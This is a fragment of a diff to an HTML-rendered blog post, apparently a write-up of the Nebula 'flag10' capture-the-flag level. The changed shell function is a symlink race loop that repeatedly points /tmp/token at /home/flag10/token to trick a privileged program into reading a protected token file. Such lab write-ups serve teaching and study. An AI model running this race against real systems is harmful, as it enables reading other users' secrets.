@@ -1940,7 +1940,7 @@ some host, port 18211.</p>
 </span><span class='line'><span class="o">}</span>
 </span><span class='line'>
 </span><span class='line'>make_symlinks<span class="o">()</span> <span class="o">{</span>
-</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> rm /tmp/token 2&gt;/dev/null<span class="p">;</span> touch /tmp/token<span class="p">;</span> ln -sf /home/flag10/token /tmp/token<span class="p">;</span> <span class="k">done</span>
+</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> ln -sf /dev/null /tmp/token <span class="p">;</span> ln -sf /home/flag10/token /tmp/token<span class="p">;</span> <span class="k">done</span>
 </span><span class='line'><span class="o">}</span>
 </span><span class='line'>
 </span><span class='line'>run_flag<span class="o">()</span> <span class="o">{</span>
